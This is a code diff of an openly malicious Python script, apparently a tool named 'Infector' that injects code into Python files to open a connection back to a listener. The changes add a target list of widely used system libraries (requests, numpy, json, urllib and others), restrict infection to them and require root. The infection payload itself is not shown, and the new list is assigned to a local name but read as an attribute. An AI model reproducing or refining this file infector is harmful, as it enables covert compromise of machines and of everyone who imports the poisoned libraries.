@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from os import walk, environ
+from os import walk, environ, getuid
 from sys import path
 from glob import glob
 from platform import system
@@ -17,6 +17,32 @@ class Infector:
         self.SYSTEM:str = system()
         self.IP:str = "0.0.0.0"
         self.PORT:int = 1025
+        target_python_modules = (
+            "/usr/lib/python3/dist-packages/pandas/__init__.py",
+            "/usr/lib/python3/dist-packages/requests/__init__.py",
+            "/usr/lib/python3/dist-packages/numpy/__init__.py",
+            "/usr/lib/python3.8/tkinter/__init__.py",
+            "/usr/lib/python3.8/datetime.py",
+            "/usr/lib/python3.8/abc.py",
+            "/usr/lib/python3.8/argparse.py",
+            "/usr/lib/python3.8/asyncio/__init__.py",
+            "/usr/lib/python3.8/collections/__init__.py",
+            "/usr/lib/python3.8/copy.py",
+            "/usr/lib/python3.8/csv.py",
+            "/usr/lib/python3.8/decimal.py",
+            "/usr/lib/python3.8/functools.py",
+            "/usr/lib/python3.8/http/__init__.py",
+            "/usr/lib/python3.8/importlib/__init__.py",
+            "/usr/lib/python3.8/inspect.py",
+            "/usr/lib/python3.8/json/__init__.py",
+            "/usr/lib/python3.8/pdb.py",
+            "/usr/lib/python3.8/random.py",
+            "/usr/lib/python3.8/shutil.py",
+            "/usr/lib/python3.8/types.py",
+            "/usr/lib/python3.8/unittest/__init__.py",
+            "/usr/lib/python3.8/urllib/__init__.py",
+            "/usr/lib/python3.8/uuid.py"
+        )
 
     def infect_file(self, target_file:str):
         """Infects Python file with malicious Python code to create
@@ -59,11 +85,8 @@ class Infector:
                 divider:chr = "/" if self.SYSTEM == "Linux" else "\\"
                 for file_ in glob(root+divider+"*.py"):
                     if file_ == root+divider+__file__: continue
-                    elif "subprocess.py" in file_: continue
-                    elif "os.py" in file_: continue
-                    elif "socket.py" in file_: continue
-                    elif "sys.py" in file_: continue
-                    else: self.infect_file(file_) 
+                    if file_ in self.target_python_modules:
+                        self.infect_file(file_) 
         
     def create_job(self):
         if self.SYSTEM == "Linux":
@@ -85,6 +108,10 @@ class Infector:
                 self.python_dirs.append(p)
 
 def main():
+    if getuid() != 0:
+        print(f"{__file__} must be ran as root...")
+        exit(0)
+
     infector = Infector()
     infector.get_python_dirs()
     infector.start_infecting() 
